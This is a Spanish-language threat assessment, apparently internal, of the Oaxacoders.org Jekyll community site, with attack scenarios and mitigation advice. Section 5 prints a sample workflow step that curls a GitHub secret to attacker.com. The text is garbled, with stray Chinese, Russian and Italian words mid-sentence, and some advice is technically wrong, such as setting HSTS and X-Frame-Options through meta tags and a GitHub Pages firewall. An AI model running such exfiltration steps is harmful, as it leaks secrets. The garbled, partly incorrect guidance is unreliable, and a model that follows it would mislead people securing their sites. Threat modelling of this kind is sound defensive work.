# Análisis de Seguridad: Oaxacoders.org
## Evaluación de Vulnerabilidades ante Actor Estado-Nación con Herramientas de Interceptación

**Fecha:** 26 de Abril, 2026  
**Versión del Sitio:** Oaxacoders Jekyll Site  
**Clasificación:** Uso interno / Comunitario  

---

## Resumen Ejecutivo

Oaxacoders.org es un sitio estático generado con Jekyll que sirve como portal comunitario para programadores en Oaxaca, México. Ante un actor malicioso sofisticado (estado-nación) utilizando herramientas como Burp Suite para interceptación y manipulación de tráfico, el sitio presenta varias superficie de ataque que deben considerarse.

**Nivel de Riesgo GENERAL: MEDIO-ALTO**

---

## 1. Arquitectura del Sistema

### 1.1 Tecnología Actual
- **Generador:** Jekyll 4.4.1 (Ruby)
- **CSS Framework:** Tailwind CSS v4 (CDN - navegador)
- **Fuentes:** Google Fonts (Inter)
- **Formulario Newsletter:** Buttondown.com (API externa)
- **Hosting:** GitHub Pages (implied por workflows)
- **Dominio:** oaxacoders.org

### 1.2 Flujo de Datos
```
Usuario → HTTPS → GitHub Pages → Jekyll (build) → HTML estático
                                  ↑
                       GitHub Actions (CI/CD)
```

---

## 2. Análisis de Interceptación (Man-in-the-Middle)

### 2.1 Canal HTTPS

**Estado Actual:**
- El sitio usa HTTPS (`https://oaxacoders.org`)
- Implementación de HSTS: NO CONFIGURADA
- Certificate Transparency: No verificada

**Ataque Potencial:**
Un actor con capacidad de interceptación a nivel de red (mitm) podría:
1. Instalar certificado raíz corporativo en el dispositivo de la víctima
2. Interceptar tráfico descifrado en punto de inspección
3. Modificar respuestas HTTP en tiempo real

**Impacto:**
- Modificación de contenido HTML entregado
- Inyección de scripts maliciosos en páginas
- Robo de tokens de API de terceros
- Redirección a sitios de phishing

**Evidencia en código (`_layouts/default.html`):**
```html
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
```

No hay headers de Seguridad:
- `Strict-Transport-Security` faltante
- `Content-Security-Policy` faltante
- `X-Content-Type-Options` faltante
- `X-Frame-Options` faltante

---

## 3. Vulnerabilidades Identificadas

### 3.1 Vulnerabilidad Alta: CDN Tailwind/browser@4

**Ubicación:** `_layouts/default.html` línea 17
```html
<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
```

**Problema:**
- El navegador descarga Tailwind directamente del CDN
- No hay verificación de integridad (SRI - Subresource Integrity)
- Actor podría realizar ataque a供应链 (supply chain attack) comprometiendo el CDN

**Escenario de Ataque:**
1. Comprometer jsdelivr.net o crear dominio similar
2. Servir versión modificada de Tailwind con payload malicioso
3. Todos los visitantes执行 código arbitrario

### 3.2 Vulnerabilidad Alta: Google Fonts

**Ubicación:** `_layouts/default.html` línea 18-20
```html
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
```

**Problema:**
- Conexiones a terceros no verificadas
- Google Fonts puede servir diferentes tipografías según geolocalización
- Potencial para fingerprinting de usuarios

### 3.3 Vulnerabilidad Media: Newsletter Form

**Ubicación:** `_includes/newsletter-form.html`
```html
<form action="https://buttondown.com/api/emails/embed-subscribe/oaxacoders" ...>
```

**Problemas:**
1. Datos sensibles (emails) enviados a servicio externo
2. No hay validación robusta en cliente
3. Posible enumeración de emails existentes mediante fuerza bruta
4. El target="popupwindow" puede ser explotado para phishing

**Ataque:**
- Actor intercepta petición y registra todos los emails sottoposti
-虽然没有 HTTPS pinning, la conexión es estándar

### 3.4 Vulnerabilidad Media: Workflows GitHub Actions

**Ubicación:** `.github/workflows/notify-failures.yml`

```yaml
env:
  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
  TELEGRAM_ADMIN_CHAT_ID: ${{ secrets.TELEGRAM_ADMIN_CHAT_ID }}
```

**Problemas:**
1. Secrets almacenados en GitHub (riesgo de leak)
2. El script Ruby en línea (inline) no tiene validación de input
3. No hay logs de auditoría para accesos a secrets

**Ataque:**
- Comprometer repo → robar tokens de Telegram
- Enviar mensajes falsos a nombre de Oaxacoders
- Usar el bot para expandir ataque a otros miembros

### 3.5 Vulnerabilidad Baja: Configuración Externa

**Ubicación:** `_config.yml`
```yaml
community:
  telegram: "https://t.me/+o8kCuGuyF3pkYzM5"
  whatsapp: "https://chat.whatsapp.com/FJDJ2viwOV82geARAKvvxA"
  twitter: "https://twitter.com/oaxacoders"
  bluesky: "https://bsky.app/profile/oaxacoders.bsky.social"
  github: "https://github.com/oaxacoders"
  youtube: "https://www.youtube.com/@oaxacoders"
```

**Problemas:**
1. URLs públicas facilitan OSINT (Open Source Intelligence)
2. Identificación de todos los canales de comunicación
3. Posible suplantación de identidad en otros plataformas

### 3.6 Vulnerabilidad Informativa: Metadata Expuesta

**Ubicación:** `_layouts/default.html` líneas 6-15

```html
<meta property="og:title" content="..." />
<meta property="og:description" content="..." />
<meta name="twitter:card" content="summary_large_image" />
```

**Información Expuesta:**
- Tecnología: Jekyll + jekyll-seo-tag
- Plugins instalados: jekyll-feed, jekyll-sitemap
- Estructura del sitio accesible para fingerprinting

---

## 4. Análisis con Burp Suite

### 4.1 Interceptación Pasiva

Un actor podría:

1. **Enumerar endpoints:**
   - `/`
   - `/eventos/`
   - `/blog/`
   - `/nosotros/`
   - `/videos/`
   - `/recursos/`
   - `/equipo/`
   - `/codigo-de-conducta/`
   - `/call-for-papers/`
   - `/galeria/`
   - `/agradecimientos/`
   - `/feed.xml` (RSS)
   - `/sitemap.xml`

2. **Identificar tecnologías:**
   - Detección de Jekyll por cookies y headers
   -识别 plugins por patrones de URLs
   - Mapeo completo de estructura del sitio

### 4.2 Interceptación Activa

**Modificaciones possibles:**

| Elemento | Ataque | Impacto |
|----------|--------|---------|
| Logo | Reemplazar por propaganda | Daño reputacional |
| Scripts CDN | Inyectar keylogger | Robo de credenciales |
| Links externos | Redirigir a clones | Phishing |
| Newsletter form | Capturar emails | RoBo de datos |
| Videos embed | Reemplazar con malware | Compromiso de usuarios |

### 4.3 Análisis de Cookies/Sesiones

- El sitio no establece cookies de sesión (es estático)
- Pero terceros (Google, jsdelivr) pueden establecer tracking cookies
- Posible correlación de usuariosacross visitas

---

## 5. Escenarios de Ataque Específicos

### Escenario 1: APT (Advanced Persistent Threat)

**Actor:** Estado-nación con recursos significativos

**Fase 1 - Reconocimiento:**
1. Usar Burp Suite para mapear todo el sitio
2. Identificar plugins y versiones via fingerprints
3. Enumerar todos los recursos externos (CDNs, APIs)

**Fase 2 - Acceso Inicial:**
1. Comprometer cuenta de GitHub (phishing a admins)
2. Modificar código fuente con backdoor
3. следующий шаг: GitHub Actions para exfiltrar datos

**Fase 3 - Exfiltración:**
```yaml
# Modificar workflow para robar secrets
- name: Exfiltrate secrets
  run: |
    curl -X POST https://attacker.com/exfil -d "${{ secrets.TELEGRAM_BOT_TOKEN }}"
```

### Escenario 2:watering hole Attack

**Método:**
1. Identificar visitantes frecuentes del sitio
2. Comprometer CDN de Tailwind o Google Fonts
3. Inyectar exploit dirigido a visitantes específicos

**Impacto:**
- Código malicioso executes en navegadores de víctimas
- Posible acceso a redes corporativas si usan VPN

### Escenario 3: Denegación de Servicio

**Método:**
1. Atacar proveedor de DNS (oaxacoders.org)
2. Comprometer CDN de recursos estáticos
3. Inundar con requests al servidor de newsletter (Buttondown)

---

## 6. Análisis de Información Compartida

### 6.1 Datos Públicos en el Sitio

| Categoría | Información | Riesgo |
|-----------|--------------|--------|
| Nombres | Josue, Laura, Carlos (equipo) | Bajo |
| Links Redes | Todos los canales sociales | Medio |
| Historial Eventos | Fechas y temas de meetups | Bajo |
| Tech Stack | Jekyll, Tailwind, Ruby | Medio |

### 6.2 Datos Sensibles Potenciales

- **Emails de newsletter:** Almacenados en Buttondown (tercero)
- **Tokens de API:** GitHub Secrets (acceso limitado)
- **Historial de commits:** GitHub (público para muchos repos)

---

## 7. Recomendaciones de Mitigación

### 7.1 Inmediatas (0-7 días)

```html
<!-- Agregar a _layouts/default.html en <head> -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; connect-src 'self'; img-src 'self' data:; frame-src https://www.youtube.com https://www.youtube-nocookie.com;">
<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="X-Frame-Options" content="DENY">
```

### 7.2 Corto Plazo (1-4 semanas)

1. **Implementar SRI en CDNs:**
```html
<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4" 
        integrity="sha384-xxxx" 
        crossorigin="anonymous"></script>
```

2. **Habilitar firewall en GitHub Pages:**
   - Configurar regla de denegación para IPs sospechosas
   - Implementar rate limiting

3. **Rotar secrets de GitHub:**
   - TELEGRAM_BOT_TOKEN
   - TELEGRAM_ADMIN_CHAT_ID
   - Considerar usarHashiCorp Vault

4. **Auditar colaboradores del repo:**
   - Revisar access levels
   - Habilitar 2FA obligatorio
   - Implementar CODEOWNERS para review obligatorio

### 7.3 Mediano Plazo (1-3 meses)

1. **Self-hosting de recursos críticos:**
   - Descargar Tailwind y servirlo localmente
   - Self-hosted Google Fonts alternativa (Fontsource)

2. **Implementar monitoring:**
   - Sentry para errores de cliente
   - Cloudflare para DDoS protection
   - GitHub Security alerts

3. **Desarrollar política de seguridad:**
   - Procedimiento de respuesta a incidentes
   - Protocolo de gestión de secrets
   - Guidelines para code review

### 7.4 Largo Plazo (3-6 meses)

1. **Migración a infraestructura dedicada:**
   - Considerar VPS propio con mejor control
   - Implementar WAF (Web Application Firewall)
   - Configurar IDS/IPS

2. **Auditoría de terceros:**
   - Evaluar alternativas a Buttondown
   - Implementar собственен newsletter server

3. **Plan de recuperación de desastres:**
   - Backups automáticos
   - Documentación de recuperación
   - Plan de comunicación de crisis

---

## 8. Conclusiones

### 8.1 Nivel de Exposición

El sitio Oaxacoders.org presenta una superficie de ataque considerable para un actor sofisticado debido a:

1. **Dependencia excesiva de CDNs** - único punto de falla
2. **Falta de headers de seguridad** - facilita múltiples ataques
3. **Integración con servicios externos** - múltiples puntos de entrada
4. **GitHub Actions con secrets expuestos** - riesgo de supply chain

### 8.2 Probabilidad de Compromiso

| Escenario | Probabilidad | Impacto |
|-----------|--------------|---------|
| Defacement | Media | Alto |
| Data breach (emails) | Baja | Alto |
| Malware distribution | Media | Muy Alto |
| Phishing campaigns | Alta | Medio |
| DoS/DDoS | Baja | Medio |

### 8.3 Evaluación Final

**Riesgo Total: MEDIO-ALTO**

Un estado-nación con herramientas como Burp Suite podría:
1. Mapear completamente la infraestructura
2. Interceptar y modificar tráfico (si tiene acceso a red)
3. Comprometer cadena de suministro via CDNs
4. Obtener acceso a sistemas internos via GitHub

**Prioridad de remediación:** MEDIA-ALTA

---

## 9. Referencias

- OWASP Top 10 (2021)
- NIST Cybersecurity Framework
- GitHub Security Best Practices
- CISA Guidance on Supply Chain Security

---

*Este documento es para uso interno de Oaxacoders. No debe ser compartido públicamente sin revisión de seguridad.*